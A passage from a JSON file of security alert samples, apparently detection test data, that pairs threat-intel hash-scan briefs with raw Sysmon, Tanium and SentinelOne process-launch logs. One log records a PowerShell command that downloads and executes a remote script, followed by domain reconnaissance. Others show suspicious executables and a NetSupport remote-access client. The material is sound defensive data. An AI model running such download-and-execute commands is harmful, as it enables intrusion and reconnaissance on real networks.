LxUsMeyVieYz*rRUBFQTkp3Me8eC516O5^jvvdn3\\u0026D$$z17mWM=+1C+FjF\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentProcessGuid\":\"{C784477D-B0D6-648B-B80A-000000004A00}\",\"ParentProcessId\":\"6632\",\"ProcessGuid\":\"{C784477D-B0F2-648B-BA0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"2352\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749896,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-06 05:34:20.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    },
    "28": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitynbtscan.exe launched by cmd.exe",
        "ini_data": [
            "<14>Nov 29 05:11:10 win-server.lunarstiiiness.com Microsoft-Windows-Sysmon[1288]: {\"EventTime\":1732770669,\"Hostname\":\"win-server.lunarstiiiness.com\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":943296,\"ProcessID\":1288,\"ThreadID\":2884,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-18\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\\r\\nUtcTime: 2024-11-28 05:11:09.033\\r\\nProcessGuid: {BE59402F-31C2-6402-8D01-000000001900}\\r\\nProcessId: 5712\\r\\nImage: D:\\\\Software\\\\nbtscan.exe\\r\\nFileVersion: -\\r\\nDescription: -\\r\\nProduct: -\\r\\nCompany: -\\r\\nOriginalFileName: -\\r\\nCommandLine: nbtscan\\r\\nCurrentDirectory: D:\\\\Software\\\\\\r\\nUser: LUNARSTIIINESS\\\\tim.smith_admin\\r\\nLogonGuid: {BE59402F-2E2D-6402-19D0-DA0000000000}\\r\\nLogonId: 0xDAD019\\r\\nTerminalSessionId: 3\\r\\nIntegrityLevel: High\\r\\nHashes: SHA1=90DA10004C8F6FAFDAA2CF18922670A745564F45,MD5=F01A9A2D1E31332ED36C1A4D2839F412,SHA256=C9D5DC956841E000BFD8762E2F0B48B66C79B79500E894B4EFA7FB9BA17E4E9E,IMPHASH=2FA43C5392EC7923ABABCED078C2F98D\\r\\nParentProcessGuid: {BE59402F-31B3-6402-8901-000000001900}\\r\\nParentProcessId: 6016\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: \\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \\r\\nParentUser: LUNARSTIIINESS\\\\tim.smith_admin\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"technique_id=T1059,technique_name=Command-Line Interface\",\"UtcTime\":\"2024-11-28 05:11:09.033\",\"ProcessGuid\":\"{BE59402F-31C2-6402-8D01-000000001900}\",\"Image\":\"D:\\\\Software\\\\nbtscan.exe\",\"FileVersion\":\"-\",\"Description\":\"-\",\"Product\":\"-\",\"Company\":\"-\",\"OriginalFileName\":\"-\",\"CommandLine\":\"nbtscan\",\"CurrentDirectory\":\"D:\\\\Software\\\\\",\"User\":\"LUNARSTIIINESS\\\\tim.smith_admin\",\"LogonGuid\":\"{BE59402F-2E2D-6402-19D0-DA0000000000}\",\"LogonId\":\"0xdad019\",\"TerminalSessionId\":\"3\",\"IntegrityLevel\":\"High\",\"Hashes\":\"SHA1=90DA10004C8F6FAFDAA2CF18922670A745564F45,MD5=F01A9A2D1E31332ED36C1A4D2839F412,SHA256=C9D5DC956841E000BFD8762E2F0B48B66C79B79500E894B4EFA7FB9BA17E4E9E,IMPHASH=2FA43C5392EC7923ABABCED078C2F98D\",\"ParentProcessGuid\":\"{BE59402F-31B3-6402-8901-000000001900}\",\"ParentProcessId\":\"6016\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \",\"ParentUser\":\"LUNARSTIIINESS\\\\tim.smith_admin\",\"EventReceivedTime\":1732770670,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\cmd.exe\r\nudm.principal.process.file.sha256: 935c1861df1f4018d698e8b65abfa02d7e9037d8f68ca3c2065b6ca165d44ad2"
        ]
    },
    "29": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitymyfile.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=2B248E9302A441C389C30A85534C0CC2,SHA256=05D6B2F8A9C4C319CA23E571B9BD77142F3C880524A67B6F6783550AF620374B,IMPHASH=9F9C7E0B30ED8F52F90B658711975D4C\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"myfile.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4965\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2305,\"ProcessId\":\"10145\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":705,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-10-06 04:33:07.115\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "30": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityClient Update.exe launched by 56823",
        "ini_data": [
            "{\"metadata\":{\"logType\":\"PROCESS_LAUNCH\",\"productVersion\":\"1.2\",\"vendorName\":\"Tanium\",\"productName\":\"Tanium Event Emitter\",\"eventTimestamp\":\"2024-11-25T09:17:47.787+00:00\"},\"principal\":{\"process\":{\"pid\":\"11705\",\"parentPid\":\"56823\",\"productSpecificProcessId\":\"11705\",\"productSpecificParentProcessId\":\"56823\",\"file\":{\"fullPath\":\"C:\\\\Users\\\\alice\\\\Downloads\\\\Client Update.exe\",\"md5\":\"17150a137c43235ad07011b552f9ff27\"}},\"hostname\":\"alice-benjamin-pc\",\"assetId\":\"alice-benjamin-pc\",\"user\":{\"userid\":\"alice\",\"groupid\":none}}}"
        ]
    },
    "31": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityClient Update.exe launched by 13326",
        "ini_data": [
            "{\"metadata\":{\"logType\":\"PROCESS_LAUNCH\",\"productVersion\":\"1.2\",\"vendorName\":\"Tanium\",\"productName\":\"Tanium Event Emitter\",\"eventTimestamp\":\"2024-09-30T08:17:35.554+00:00\"},\"principal\":{\"process\":{\"pid\":\"22902\",\"parentPid\":\"13326\",\"productSpecificProcessId\":\"22902\",\"productSpecificParentProcessId\":\"13326\",\"file\":{\"fullPath\":\"C:\\\\Users\\\\alice\\\\Downloads\\\\Client Update.exe\",\"md5\":\"17150a137c43235ad07011b552f9ff27\"}},\"hostname\":\"alice-benjamin-pc\",\"assetId\":\"alice-benjamin-pc\",\"user\":{\"userid\":\"alice\",\"groupid\":none}}}"
        ]
    },
    "32": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysoftware.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\\\" --AutoStart\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=65D2046ADD5EF298FBA308EDB9C291DC,SHA256=60C85D1E4B4698E35E83519E16025AA11B6F79A69F02E483A8BAF5E97CD04752,IMPHASH=C7006B0F6ACDFB37FFEEBFD2C1715395\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\51e3b645-cd3e-4087-8175-9451ecd98863\\\\software.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-A525-648A-09F3-030000000000}\",\"LogonId\":\"0x3f309\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-A525-648A-6A00-000000004400}\",\"ParentProcessId\":\"4876\",\"ProcessGuid\":\"{C784477D-840C-6517-3806-000000004400}\",\"ProcessID\":2300,\"ProcessId\":\"5252\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366213,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":680,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-22 05:32:29.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "33": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityAvl.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\Avl.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=4064209A8AB2F313551CBB57AC1FCD94,SHA256=0000A30F08A3BC2D09C7A03A12A03C85BC6F01F264652170C49826DD944DC018,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\Avl.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"Avl.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4967\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2307,\"ProcessId\":\"10147\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379907,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":707,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-10-10 04:32:36.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "34": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityAvl.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\Avl.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=4064209A8AB2F313551CBB57AC1FCD94,SHA256=0000A30F08A3BC2D09C7A03A12A03C85BC6F01F264652170C49826DD944DC018,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\Avl.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"Avl.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4967\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2307,\"ProcessId\":\"10147\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379907,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":707,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-06 05:32:30.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "35": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityF20B.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=317C1DA3D49D534FDDE575395DA84879,SHA256=72674E9A3C32D5457C98EF723B938ABC0295329C7EC58F9E07A0CB1E99631F48,IMPHASH=84E31D32A2CB7830E40CFCBEA395C7A1\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-8F33-6539-44AD-030000000000}\",\"LogonId\":\"0x3ad44\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-8F34-6539-6A00-000000003B00}\",\"ParentProcessId\":\"4944\",\"ProcessGuid\":\"{C784477D-ACAA-653D-7D06-000000003B00}\",\"ProcessID\":2332,\"ProcessId\":\"6284\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":462620,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":696,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-09-25 04:33:26.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "36": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1727843519299,\"meta\":{\"traceId\":\"01GE20GABCTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17278435192915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1727843519299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36595/'); Get-NetComputer -ping -operatingsystem *server*\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17278435192995951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1727843519299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "37": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityexecutable.exe launched by sandbox-control.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=71826BA081E303866CE2A2534491A2F7,SHA256=62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11,IMPHASH=AFCDF79BE1557326C854B6E20CB900A7\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-A5DD-61A4-355F-030000000000}\",\"LogonId\":\"0x35f35\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"sandbox-control.exe\\\"\",\"ParentImage\":\"sandbox-control.exe\",\"ParentProcessGuid\":\"{C784477D-A6BC-61A4-F705-000000003C00}\",\"ParentProcessId\":\"6400\",\"ProcessGuid\":\"{C784477D-F8D0-6221-2706-000000003C00}\",\"ProcessID\":2200,\"ProcessId\":\"3848\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":84589,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":3056,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-27 05:32:01.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: sandbox-control.exe"
        ]
    },
    "38": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysonic.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\sonic.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=A55DB6BFA7DEDECF7365567B803CB013,SHA256=01153CFE9FE9F1C3460E02D254BBE49B7B07C343061B7630234D95948D8F6106,IMPHASH=31E8556425EF4035DBFC678A002AD91B\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\sonic.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"GorgerousOnce.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4966\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2306,\"ProcessId\":\"10146\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379906,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":706,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-19 05:32:30.116\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "39": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client 